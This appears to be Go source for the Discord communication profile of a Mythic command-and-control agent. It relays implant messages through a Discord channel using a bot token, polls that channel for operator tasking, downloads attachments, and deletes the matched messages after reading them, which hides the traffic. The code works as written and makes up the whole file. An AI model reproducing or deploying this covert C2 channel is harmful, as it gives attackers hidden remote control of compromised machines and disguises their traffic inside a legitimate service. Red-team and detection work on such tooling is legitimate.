package discord

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"strconv"
	"strings"
	"time"
)

// ─── Discord API Methods ─────────────────────────────────────────────────────

// matchesAgent checks if a server→agent message is addressed to this agent.
func (d *DiscordProfile) matchesAgent(respWrapper *MythicMessageWrapper, clientID, senderID string) bool {
	return !respWrapper.ToServer && (respWrapper.ClientID == clientID ||
		respWrapper.SenderID == senderID ||
		respWrapper.ClientID == senderID ||
		(d.PayloadUUID != "" && respWrapper.ClientID == d.PayloadUUID))
}

// sendAndPoll sends a Mythic message via Discord and polls for the server's response.
// mythicMessage is the base64-encoded Mythic message (UUID + encrypted payload).
// senderID is the agent's UUID used for message correlation.
func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensitiveConfig) (string, error) {
	results, err := d.sendAndPollAll(mythicMessage, senderID, cfg)
	if err != nil {
		return "", err
	}
	if len(results) == 0 {
		return "", fmt.Errorf("no response after polling")
	}
	return results[0], nil
}

// sendAndPollAll sends a Mythic message via Discord and collects ALL matching server→agent
// responses. In push C2 mode, multiple messages may be queued (get_tasking response + pushed
// tasks), so this function returns all of them rather than just the first match.
func (d *DiscordProfile) sendAndPollAll(mythicMessage, senderID string, cfg *sensitiveConfig) ([]string, error) {
	clientID := d.nextClientID()

	wrapper := MythicMessageWrapper{
		Message:  mythicMessage,
		SenderID: senderID,
		ToServer: true,
		ClientID: clientID,
	}

	wrapperJSON, err := json.Marshal(wrapper)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal wrapper: %w", err)
	}

	// Send to Discord — use file attachment if message is too large
	if len(wrapperJSON) > maxMessageLength {
		if err := d.sendFileMessage(wrapperJSON, senderID+"server", cfg); err != nil {
			return nil, fmt.Errorf("file upload failed: %w", err)
		}
	} else {
		if err := d.sendTextMessage(string(wrapperJSON), cfg); err != nil {
			return nil, fmt.Errorf("text message failed: %w", err)
		}
	}

	// Poll for responses matching our sender_id with to_server=false.
	// Collect ALL matching messages — in push C2, both the get_tasking response
	// and pushed task messages may be present simultaneously.
	var totalFetched, totalParsed, totalSkipped int
	for attempt := 0; attempt < d.MaxRetries; attempt++ {
		time.Sleep(time.Duration(d.PollInterval) * time.Second)

		messages, err := d.getMessages(cfg, 100) // Discord API max is 100
		if err != nil {
			if d.Debug {
				log.Printf("poll error (attempt %d/%d): %v", attempt+1, d.MaxRetries, err)
			}
			continue
		}
		totalFetched += len(messages)

		var matched []string
		for _, msg := range messages {
			respWrapper, err := d.parseDiscordMessage(msg, cfg)
			if err != nil {
				totalSkipped++
				if d.Debug {
					log.Printf("parse skip (attempt %d): msgID=%s err=%v", attempt+1, msg.ID, err)
				}
				continue
			}
			totalParsed++

			if d.matchesAgent(respWrapper, clientID, senderID) {
				d.deleteMessage(msg.ID, cfg)
				matched = append(matched, respWrapper.Message)
			}
		}

		if len(matched) > 0 {
			if d.Debug {
				log.Printf("poll matched %d messages (attempt %d, fetched=%d parsed=%d skipped=%d)",
					len(matched), attempt+1, totalFetched, totalParsed, totalSkipped)
			}
			// Catch-up re-polls: in push C2, tasks arrive as separate gRPC messages
			// and the Discord bot writes them asynchronously. Multiple catch-up polls
			// give time for tasks pushed during this exchange to appear in the channel.
			for catchUp := 0; catchUp < catchUpPolls; catchUp++ {
				time.Sleep(time.Duration(d.PollInterval) * time.Second)
				extraMsgs, err := d.getMessages(cfg, 100)
				if err != nil {
					continue
				}
				foundMore := false
				for _, msg := range extraMsgs {
					respWrapper, err := d.parseDiscordMessage(msg, cfg)
					if err != nil {
						continue
					}
					if d.matchesAgent(respWrapper, clientID, senderID) {
						d.deleteMessage(msg.ID, cfg)
						matched = append(matched, respWrapper.Message)
						foundMore = true
					}
				}
				// If no new matches found, stop catch-up early
				if !foundMore {
					break
				}
			}
			return matched, nil
		}
	}

	if d.Debug {
		log.Printf("poll timeout: %d attempts, fetched=%d parsed=%d skipped=%d",
			d.MaxRetries, totalFetched, totalParsed, totalSkipped)
	}
	return nil, fmt.Errorf("no response after %d polling attempts (fetched=%d parsed=%d skipped=%d)",
		d.MaxRetries, totalFetched, totalParsed, totalSkipped)
}

// parseDiscordMessage extracts a MythicMessageWrapper from a Discord message.
// Handles both inline text and file attachment formats.
func (d *DiscordProfile) parseDiscordMessage(msg discordMessage, cfg *sensitiveConfig) (*MythicMessageWrapper, error) {
	var wrapperJSON []byte

	if len(msg.Attachments) > 0 { //nolint:gocritic // sequential message type routing
		// Server sends large messages as file attachments
		content, err := d.downloadAttachment(msg.Attachments[0].URL, cfg)
		if err != nil {
			return nil, fmt.Errorf("failed to download attachment: %w", err)
		}
		wrapperJSON = content
	} else if msg.Content != "" {
		wrapperJSON = []byte(msg.Content)
	} else {
		return nil, fmt.Errorf("empty message")
	}

	// Handle potential double-serialization (server's Unescape logic)
	cleaned := string(wrapperJSON)
	if strings.HasPrefix(cleaned, "\"") && strings.HasSuffix(cleaned, "\"") {
		cleaned = cleaned[1 : len(cleaned)-1]
		cleaned = strings.ReplaceAll(cleaned, "\\\"", "\"")
	}

	var wrapper MythicMessageWrapper
	if err := json.Unmarshal([]byte(cleaned), &wrapper); err != nil {
		return nil, fmt.Errorf("failed to parse wrapper: %w", err)
	}

	return &wrapper, nil
}

// sendTextMessage sends a text message to the Discord channel.
func (d *DiscordProfile) sendTextMessage(content string, cfg *sensitiveConfig) error {
	endpoint := fmt.Sprintf("%s/channels/%s/messages", discordAPIBase, cfg.ChannelID)

	payload := map[string]string{"content": content}
	body, _ := json.Marshal(payload)

	req, err := http.NewRequest("POST", endpoint, bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("failed to create discord text message request: %w", err)
	}
	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", discordBotUA)

	resp, err := d.doWithRateLimit(req)
	if err != nil {
		return fmt.Errorf("discord text message send failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord API error %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}

// sendFileMessage sends a file attachment to the Discord channel.
// filename should end with "server" for agent→server messages.
func (d *DiscordProfile) sendFileMessage(content []byte, filename string, cfg *sensitiveConfig) error {
	endpoint := fmt.Sprintf("%s/channels/%s/messages", discordAPIBase, cfg.ChannelID)

	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	// Create the file part with proper content type
	partHeader := make(textproto.MIMEHeader)
	partHeader.Set("Content-Disposition", fmt.Sprintf(`form-data; name="files[0]"; filename="%s"`, filename))
	partHeader.Set("Content-Type", "application/octet-stream")

	part, err := writer.CreatePart(partHeader)
	if err != nil {
		return fmt.Errorf("failed to create multipart part: %w", err)
	}
	if _, err := part.Write(content); err != nil {
		return fmt.Errorf("failed to write file content: %w", err)
	}
	writer.Close()

	req, err := http.NewRequest("POST", endpoint, &buf)
	if err != nil {
		return fmt.Errorf("failed to create discord file upload request: %w", err)
	}
	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("User-Agent", discordBotUA)

	resp, err := d.doWithRateLimit(req)
	if err != nil {
		return fmt.Errorf("discord file upload send failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord file upload error %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}

// getMessages retrieves recent messages from the Discord channel.
func (d *DiscordProfile) getMessages(cfg *sensitiveConfig, limit int) ([]discordMessage, error) {
	endpoint := fmt.Sprintf("%s/channels/%s/messages?limit=%d", discordAPIBase, cfg.ChannelID, limit)

	req, err := http.NewRequest("GET", endpoint, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
	req.Header.Set("User-Agent", discordBotUA)

	resp, err := d.doWithRateLimit(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("discord API error %d: %s", resp.StatusCode, string(respBody))
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var messages []discordMessage
	if err := json.Unmarshal(body, &messages); err != nil {
		return nil, fmt.Errorf("failed to parse messages: %w", err)
	}

	return messages, nil
}

// deleteMessage removes a message from the Discord channel.
func (d *DiscordProfile) deleteMessage(messageID string, cfg *sensitiveConfig) {
	endpoint := fmt.Sprintf("%s/channels/%s/messages/%s", discordAPIBase, cfg.ChannelID, messageID)

	req, err := http.NewRequest("DELETE", endpoint, nil)
	if err != nil {
		log.Printf("delete request error: %v", err)
		return
	}
	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
	req.Header.Set("User-Agent", discordBotUA)

	resp, err := d.doWithRateLimit(req)
	if err != nil {
		log.Printf("delete error: %v", err)
		return
	}
	resp.Body.Close()
}

// downloadAttachment downloads file content from a Discord attachment URL.
func (d *DiscordProfile) downloadAttachment(attachmentURL string, cfg *sensitiveConfig) ([]byte, error) {
	req, err := http.NewRequest("GET", attachmentURL, nil)
	if err != nil {
		return nil, err
	}
	// Attachment URLs are CDN URLs that don't need bot auth
	req.Header.Set("User-Agent", discordBotUA)

	resp, err := d.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("attachment download failed: status %d", resp.StatusCode)
	}

	return io.ReadAll(resp.Body)
}

// doWithRateLimit executes an HTTP request with Discord rate limit handling.
// On 429 responses, it waits for the Retry-After duration and retries.
func (d *DiscordProfile) doWithRateLimit(req *http.Request) (*http.Response, error) {
	for attempt := 0; attempt < 5; attempt++ {
		// Clone the request for retries (body may be consumed)
		var reqCopy *http.Request
		if attempt == 0 {
			reqCopy = req
		} else {
			var err error
			reqCopy, err = cloneRequest(req)
			if err != nil {
				return nil, err
			}
		}

		resp, err := d.client.Do(reqCopy)
		if err != nil {
			return nil, err
		}

		if resp.StatusCode != http.StatusTooManyRequests {
			return resp, nil
		}

		// Rate limited — parse Retry-After and wait
		resp.Body.Close()
		retryAfter := resp.Header.Get("Retry-After")
		waitSeconds := 5.0 // Default backoff
		if retryAfter != "" {
			if parsed, err := strconv.ParseFloat(retryAfter, 64); err == nil {
				waitSeconds = parsed
			}
		}
		log.Printf("rate limited, retry in %.1fs", waitSeconds)
		time.Sleep(time.Duration(waitSeconds*1000) * time.Millisecond)
	}
	return nil, fmt.Errorf("rate limited after 5 retries")
}

// cloneRequest creates a copy of an HTTP request for retry purposes.
func cloneRequest(req *http.Request) (*http.Request, error) {
	clone := req.Clone(req.Context())
	if req.Body != nil {
		bodyBytes, err := io.ReadAll(req.Body)
		if err != nil {
			return nil, err
		}
		req.Body = io.NopCloser(bytes.NewReader(bodyBytes))
		clone.Body = io.NopCloser(bytes.NewReader(bodyBytes))
	}
	return clone, nil
}
